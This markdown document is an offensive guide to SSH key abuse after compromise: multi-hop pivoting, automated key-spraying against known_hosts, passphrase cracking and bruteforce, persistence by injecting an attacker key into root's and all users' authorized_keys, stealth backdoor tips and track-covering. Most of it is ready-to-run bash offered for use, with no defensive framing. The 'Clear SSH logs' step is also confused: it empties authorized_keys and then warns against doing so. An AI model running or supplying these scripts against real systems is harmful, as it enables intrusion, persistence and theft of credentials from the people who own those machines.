# SSH Key Scanner Lateral Movement Workflows

## Multi-Hop SSH Pivoting

Found SSH keys to multiple hosts? Build a pivot chain.

### Scenario: Single Compromised Box

**Found keys:**
```bash
~/.ssh/id_rsa → user@jumphost
~/.ssh/id_rsa.jump1 → user@internal-server
~/.ssh/known_hosts → 192.168.1.50, 192.168.1.51, 192.168.1.52
```

**Pivot Chain:**
```
Attacker
  ↓
Compromised Box (has SSH key to jumphost)
  ↓
Jumphost (has SSH key to internal-server)
  ↓
Internal-Server (access to sensitive data)
```

**Execution:**
```bash
# 1. From compromised box, SSH to jumphost:
ssh -i ~/.ssh/id_rsa user@jumphost

# 2. From jumphost, check for keys:
ls -la ~/.ssh/

# 3. SSH deeper:
ssh -i ~/.ssh/id_rsa.internal user@internal-server

# 4. Profit
cat /var/www/html/config.php
```

### Automated Pivot Script

```bash
#!/bin/bash
# Recursive SSH enumeration + pivoting

TARGET="$1"
KEY="$2"
DEPTH="${3:-2}"

pivot_recursive() {
    local host=$1
    local key=$2
    local depth=$3
    
    if [ $depth -le 0 ]; then return; fi
    
    echo "[*] Pivoting to $host..."
    
    # Check for SSH keys on target
    ssh -i "$key" -o StrictHostKeyChecking=no "$host" \
        'find ~/.ssh -type f -readable 2>/dev/null | while read keyfile; do
            echo "[+] Found: $keyfile"
            
            # Try key on known hosts
            grep -oE "^[^ ]+" ~/.ssh/known_hosts 2>/dev/null | cut -d: -f1 | while read knownhost; do
                timeout 2 ssh -i "$keyfile" -o ConnectTimeout=2 "$knownhost" whoami 2>/dev/null && \
                    echo "[✓] SSH via $keyfile → $knownhost"
            done
        done'
}

pivot_recursive "$TARGET" "$KEY" "$DEPTH"
```

---

## SSH Key Cracking Workflow

Found encrypted SSH keys? Crack them.

### Tools & Commands

**1. John the Ripper**
```bash
# Convert SSH key to john format:
ssh2john id_rsa > hash.txt

# Crack:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Or:
john --incremental:ascii hash.txt
```

**2. Hashcat**
```bash
# SSH key to hashcat format:
ssh2john id_rsa > hash.txt

# Crack (mode 22931 = SSH private key passphrase):
hashcat -m 22931 hash.txt rockyou.txt
```

**3. Manual Bruteforce (If tools unavailable)**
```bash
#!/bin/bash
# Bruteforce SSH key passphrase

KEYFILE="$1"
WORDLIST="$2"

while IFS= read -r password; do
    if ssh-keygen -y -P "$password" -f "$KEYFILE" > /dev/null 2>&1; then
        echo "[+] SUCCESS: $password"
        exit 0
    fi
done < "$WORDLIST"
```

---

## Known Hosts Exploitation

Found `~/.ssh/known_hosts`? Extract all SSH servers the user has accessed.

### Parsing known_hosts

```bash
# Extract IP:PORT pairs:
cat ~/.ssh/known_hosts | cut -d' ' -f1 | sort -u

# Parse to list for mass scanning:
cat ~/.ssh/known_hosts | cut -d' ' -f1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' > ssh_targets.txt

# Then scan:
nmap -p22 -iL ssh_targets.txt
```

### SSH Server Enumeration (from known_hosts)

```bash
#!/bin/bash
# For each known SSH host, try to connect with found keys

KNOWN_HOSTS="$1"
KEYDIR="$2"

cat "$KNOWN_HOSTS" | cut -d' ' -f1 | cut -d: -f1 | sort -u | while read host; do
    echo "[*] Testing $host..."
    
    for key in "$KEYDIR"/id_*; do
        [ -f "$key" ] || continue
        
        if timeout 3 ssh -i "$key" -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$host" whoami 2>/dev/null; then
            echo "[+] SUCCESS: $key → $host"
        fi
    done
done
```

---

## Authorized Keys Manipulation (Post-Compromise Persistence)

After privilege escalation, backdoor other user accounts.

### SSH Key Injection

```bash
# 1. Generate attacker SSH key (on attacker machine):
ssh-keygen -t rsa -f attacker_key -N ""

# 2. On compromised machine (as root):
ADMIN_USER="admin"
PUBKEY="ssh-rsa AAAA..."

# Add to root's authorized_keys:
echo "$PUBKEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Add to other privilege users:
for user in $(cat /etc/passwd | cut -d: -f1); do
    if [ -d "/home/$user" ]; then
        echo "$PUBKEY" >> "/home/$user/.ssh/authorized_keys"
        chown "$user:$user" "/home/$user/.ssh/authorized_keys"
        chmod 600 "/home/$user/.ssh/authorized_keys"
    fi
done
```

### Stealth Backdooring

```bash
# 1. Use authorized_keys from existing legitimate user:
# Copy legitimate SSH key into authorized_keys (harder to detect)

# 2. Split/hide key:
# Instead of one long line, inject into environment variables
echo "command=\"/bin/bash\",from=\"*\" ssh-rsa AAAA..." >> authorized_keys

# 3. Use .ssh/config tricks:
# Instead of authorized_keys, modify ~/.ssh/config to proxy through attacker
```

### Covering Tracks

```bash
# After SSH persistence:
# 1. Clear SSH logs:
cat /dev/null > ~/.ssh/authorized_keys  # Don't do this! Restore legit keys first

# 2. Fake last login:
touch -t 202301010000 ~/.ssh/authorized_keys

# 3. Monitor: auditd/sysmon logs auth events
```

---

## SSH Config Manipulation

Found `~/.ssh/config` with hardcoded passwords or interesting hosts?

### Example SSH Config

```
Host internal-server
    HostName 10.20.30.40
    User admin
    IdentityFile ~/.ssh/internal_key
    Port 2222

Host proxy
    HostName bastion.company.com
    User admin
    IdentityFile ~/.ssh/bastion_key
    ProxyCommand ssh -q -W %h:%p jumphost
```

### Extract Useful Info

```bash
# Extract all configured hosts:
grep "^Host " ~/.ssh/config | awk '{print $2}'

# Extract specific user:
grep -A 2 "Host internal" ~/.ssh/config | grep User | awk '{print $2}'

# Extract custom ports:
grep -E "Host|Port" ~/.ssh/config
```

### Exploit Hardcoded Credentials

```bash
# If config has plaintext password (bad practice but happens):
grep -i password ~/.ssh/config

# Some SSH configs use ProxyCommand with embedded creds:
grep ProxyCommand ~/.ssh/config | grep -o '[^ ]*:[^ ]*@'
```

---

## Lateral Movement Priority Matrix

| Target | Impact | Effort | Detectability |
|---|---|---|---|
| **Root SSH Key** | 🔴 Max | 🟢 Trivial | 🔴 High |
| **Domain Admin SSH Key** | 🔴 Max | 🟢 Trivial | 🔴 High |
| **Service Account Key (root privs)** | 🔴 Max | 🟢 Trivial | 🟡 Medium |
| **Developer SSH Key (sudo privs)** | ⚠️ High | 🟢 Trivial | 🟡 Medium |
| **User SSH Key (network pivoting)** | ⚠️ High | 🟡 Easy | 🟢 Low |
| **Unencrypted Keys** | 🔴 Max | 🟢 Trivial | 🟢 Low |
| **Password-Protected Keys (weak password)** | ⚠️ High | 🟡 Easy | 🟢 Low |

---

## References

- [HackTricks SSH Key Abuse](https://book.hacktricks.xyz/network-services-pentesting/ssh)
- [GTFOBins SSH Exploitation](https://gtfobins.github.io/)
- [SSH Config Tricks](https://man.openbsd.org/ssh_config)
- [ssh2john Documentation](https://github.com/openwall/john)
